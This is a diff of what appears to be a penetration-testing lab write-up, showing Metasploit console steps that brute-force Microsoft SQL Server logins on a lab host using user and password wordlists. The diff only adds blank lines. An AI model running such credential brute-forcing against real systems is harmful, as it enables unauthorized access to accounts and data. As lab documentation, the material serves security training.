@@ -303,13 +303,21 @@ We can run a ipconfig remotely on the target.
 - Version: Microsoft SQL Server 2019, 15.00.200.00; RTM
 
 ### Discovering valid users and passwords using metasploit:
+
 `msfconsole` (bruteforce our way into user logon and password)
+
     msf6: `use auxiliary/scanner/mssql/mssql_login`
+    
     msf6: `setg rhosts 10.2.27.50`
+    
     msf6: `set user_file /root/Desktop/wordlist/common_users.txt`
+    
     msf6: `set pass_file /root/Desktop/wordlist/100-common-passwords.txt`
+    
     msf6: `set verbose false`
+
     msf6: `options`
+    
     msf6: `run`
 
 We were able to enumerate following users and passwords:
